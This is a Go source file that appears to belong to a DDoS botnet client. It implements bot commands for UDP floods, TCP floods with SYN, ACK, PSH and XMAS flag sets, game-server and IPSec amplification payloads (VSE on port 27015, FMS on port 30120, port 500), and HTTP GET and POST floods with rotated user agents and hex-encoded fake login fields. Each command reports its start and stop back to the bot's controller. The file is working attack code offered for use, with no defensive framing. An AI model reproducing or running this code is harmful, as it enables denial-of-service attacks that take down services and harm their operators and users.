package lib

import (
	"encoding/json"
	"strings"
)

/*
	GET header
*/
var httpAgent = []string{
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; HbTools 4.7.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; InfoPath.1; HbTools 4.8.0)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.2; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
}

/*
	POST payload
*/
var (
	postPayload, _ = json.Marshal(map[string]string{
		"login":          "\x53\x6A\x5F\x39\x43\x69\x4E\x6B\x6B\x6E\x34",
		"username":       "\x39\x47\x63\x34\x51\x54\x71\x73\x6C\x4E\x34",
		"email":          "\x54\x49\x66\x41\x6B\x4F\x42\x4D\x66\x35\x41",
		"password":       "\x46\x43\x65\x46\x64\x61\x38\x6E\x53\x6E\x6F",
		"pass":           "\x30\x53\x66\x55\x35\x36\x49\x44\x73\x62\x34",
		"login_email":    "\x79\x51\x71\x52\x39\x6A\x45\x61\x63\x43\x59",
		"login_password": "\x52\x44\x48\x6A\x65\x69\x79\x73\x33\x61\x30",
	})
)

var (
	/*
		AMP payload
	*/
	queryPrefix  = "\xff\xff\xff\xff"
	vsePayload   = "\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79"
	fmsPayload   = "\x67\x65\x74\x73\x74\x61\x74\x75\x73"
	ipsecPayload = "\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
)

func setAttackSwitch() {
	if setCall, setKey := SetupCaller(); setKey {
		setCall.CallAttack.attackSwitch = true
		setCall.CallAttack.reportSwitch = true
	}
}

func (b *Bot) UDP() {
	b.Report("START UDP FLOOD ATTACK: " + Recv(*BotReader, 5))
	if setCall, setKey := SetupCaller(); setKey {
		a := &Attack{
			srcAddr:      setCall.CallAttack.srcAddr,
			dstAddr:      setCall.CallAttack.dstAddr,
			dstPort:      setCall.CallAttack.dstPort,
			ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
			attackSwitch: setCall.CallAttack.attackSwitch,
			reportSwitch: setCall.CallAttack.reportSwitch,
		}
		a.udpPacket()
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP UDP FLOOD ATTACKING!!!")
		}
	}
}

func (b *Bot) TCP() {
	storeOpt := strings.ToUpper(ComdSetup(4, "-"))
	b.Report("START TCP[" + storeOpt + "] FLOOD ATTACKING: " + Recv(*BotReader, 6))
	if setCall, setKey := SetupCaller(); setKey {
		if value, key := TCPAttackMap[setCall.CallAttack.flags]; key {
			a := &Attack{
				srcAddr:      setCall.CallAttack.srcAddr,
				dstAddr:      setCall.CallAttack.dstAddr,
				dstPort:      setCall.CallAttack.dstPort,
				ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
				synFlag:      value.synFlag,
				ackFlag:      value.ackFlag,
				rstFlag:      value.rstFlag,
				pshFlag:      value.pshFlag,
				finFlag:      value.finFlag,
				urgFlag:      value.urgFlag,
				attackSwitch: setCall.CallAttack.attackSwitch,
				reportSwitch: setCall.CallAttack.reportSwitch,
			}
			a.tcpPacket()
		}
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP TCP[" + storeOpt + "] FLOOD ATTACKING!!!")
		}
	}
}

func (b *Bot) SAF() {
	b.Report("START SAF FLOOD ATTACK: " + Recv(*BotReader, 5))
	if setCall, setKey := SetupCaller(); setKey {
		a := &Attack{
			srcAddr:      setCall.CallAttack.srcAddr,
			dstAddr:      setCall.CallAttack.dstAddr,
			dstPort:      setCall.CallAttack.dstPort,
			ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
			synFlag:      true,
			ackFlag:      true,
			attackSwitch: setCall.CallAttack.attackSwitch,
			reportSwitch: setCall.CallAttack.reportSwitch,
		}
		a.tcpPacket()
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP SAF FLOOD ATTACKING!!!")
		}
	}
}

func (b *Bot) PAF() {
	b.Report("START PAF FLOOD ATTACK: " + Recv(*BotReader, 5))
	if setCall, setKey := SetupCaller(); setKey {
		a := &Attack{
			srcAddr:      setCall.CallAttack.srcAddr,
			dstAddr:      setCall.CallAttack.dstAddr,
			dstPort:      setCall.CallAttack.dstPort,
			ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
			pshFlag:      true,
			ackFlag:      true,
			attackSwitch: setCall.CallAttack.attackSwitch,
			reportSwitch: setCall.CallAttack.reportSwitch,
		}
		a.tcpPacket()
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP PAF FLOOD ATTACKING!!!")
		}
	}
}

func (b *Bot) XMAS() {
	b.Report("START XMAS FLOOD ATTACK: " + Recv(*BotReader, 5))
	if setCall, setKey := SetupCaller(); setKey {
		a := &Attack{
			srcAddr:      setCall.CallAttack.srcAddr,
			dstAddr:      setCall.CallAttack.dstAddr,
			dstPort:      setCall.CallAttack.dstPort,
			ddosPayload:  sockBuffer(string(setCall.CallAttack.ddosPayload)),
			synFlag:      true,
			ackFlag:      true,
			rstFlag:      true,
			pshFlag:      true,
			finFlag:      true,
			urgFlag:      true,
			attackSwitch: setCall.CallAttack.attackSwitch,
			reportSwitch: setCall.CallAttack.reportSwitch,
		}
		a.tcpPacket()
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP XMAS FLOOD ATTACKING!!!")
		}
	}
}

func (b *Bot) VSE() {
	b.Report("START VSE ATTACK: " + Recv(*BotReader, 5))
	if setCall, setKey := SetupCaller(); setKey {
		a := &Attack{
			srcAddr:      setCall.CallAttack.srcAddr,
			dstAddr:      setCall.CallAttack.dstAddr,
			dstPort:      "27015",
			ddosPayload:  []byte(queryPrefix + vsePayload),
			attackSwitch: setCall.CallAttack.attackSwitch,
			reportSwitch: setCall.CallAttack.reportSwitch,
		}
		a.udpPacket()
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP VSE ATTACKING!!!")
		}
	}
}

func (b *Bot) FMS() {
	b.Report("START FMS ATTACK: " + Recv(*BotReader, 5))
	if setCall, setKey := SetupCaller(); setKey {
		a := &Attack{
			srcAddr:      setCall.CallAttack.srcAddr,
			dstAddr:      setCall.CallAttack.dstAddr,
			dstPort:      "30120",
			ddosPayload:  []byte(queryPrefix + fmsPayload),
			attackSwitch: setCall.CallAttack.attackSwitch,
			reportSwitch: setCall.CallAttack.reportSwitch,
		}
		a.udpPacket()
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP FMS ATTACKING!!!")
		}
	}
}

func (b *Bot) IPSEC() {
	b.Report("START IPSEC ATTACK: " + Recv(*BotReader, 5))
	if setCall, setKey := SetupCaller(); setKey {
		a := &Attack{
			srcAddr:      setCall.CallAttack.srcAddr,
			dstAddr:      setCall.CallAttack.dstAddr,
			dstPort:      "500",
			ddosPayload:  []byte(ipsecPayload),
			attackSwitch: setCall.CallAttack.attackSwitch,
			reportSwitch: setCall.CallAttack.reportSwitch,
		}
		a.udpPacket()
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP IPSEC ATTACKING!!!")
		}
	}
}

func (b *Bot) GET() {
	b.Report("START GET FLOOD ATTACK: " + Recv(*BotReader, 4))
	if setCall, setKey := SetupCaller(); setKey {
		a := &Attack{
			url:          setCall.CallAttack.url,
			httpMethod:   "GET",
			reqHeader:    "user-agent",
			attackSwitch: setCall.CallAttack.attackSwitch,
			reportSwitch: setCall.CallAttack.reportSwitch,
		}
		a.getRequest()
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP GET FLOOD ATTACKING!!!")
		}
	}
}

func (b *Bot) POLING() {
	b.Report("START POLING FLOOD ATTACK: " + Recv(*BotReader, 4))
	if setCall, setKey := SetupCaller(); setKey {
		a := &Attack{
			url:          setCall.CallAttack.url,
			httpMethod:   "POST",
			reqHeader:    string(postPayload),
			attackSwitch: setCall.CallAttack.attackSwitch,
			reportSwitch: setCall.CallAttack.reportSwitch,
		}
		a.postRequest()
	}
	if callSwitch, keySwitch := SetupCaller(); keySwitch {
		if callSwitch.CallAttack.reportSwitch {
			b.Report("STOP POLING FLOOD ATTACKING!!!")
		}
	}
}
